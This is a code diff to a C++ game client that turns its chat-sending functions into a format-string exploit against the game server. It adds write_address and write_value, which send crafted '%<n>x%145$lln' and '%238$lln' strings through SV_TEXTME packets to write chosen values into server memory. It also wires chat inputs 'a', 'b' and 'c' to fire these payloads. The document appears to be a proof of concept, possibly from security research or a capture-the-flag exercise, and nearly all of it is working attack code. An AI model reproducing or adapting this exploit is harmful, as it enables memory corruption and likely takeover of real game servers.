@@ -287,25 +287,43 @@ void send_payload()
     sendpackettoserv(1, p.finalize());
 }
 
-void send_format_payload()
+#include <sstream>
+void write_address()
 {
-    char format[] = "hello%n%n%n%n%n";
+    unsigned long long address = 0x1337;
+    std::stringstream format;
+    format << "hello%" << std::to_string(address - 0x9) << "x%145$lln";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
     putint(p, SV_TEXTME);
-    sendstring(format, p);
+    sendstring(format.str().c_str(), p);
+    sendpackettoserv(1, p.finalize());
+}
+
+void write_value()
+{
+    unsigned long long value = 0x7331;
+    std::stringstream format;
+    format << "world%" << std::to_string(value - 0x9) << "x%238$lln";
+    packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
+    putint(p, SV_TEXTME);
+    sendstring(format.str().c_str(), p);
     sendpackettoserv(1, p.finalize());
 }
 
 void toserver(char *text)
 {
-    send_payload();
+    if (!strcmp(text, "a"))
+        send_payload();
+    if (!strcmp(text, "b"))
+        write_address();
+    if (!strcmp(text, "c"))
+        write_value();
     // _toserver(text, SV_TEXT, SV_TEAMTEXT);
 }
 
 void toserverme(char *text)
 {
-    send_format_payload();
-    // _toserver(text, SV_TEXTME, SV_TEAMTEXTME);
+    _toserver(text, SV_TEXTME, SV_TEAMTEXTME);
 }
 
 void echo(char *text)
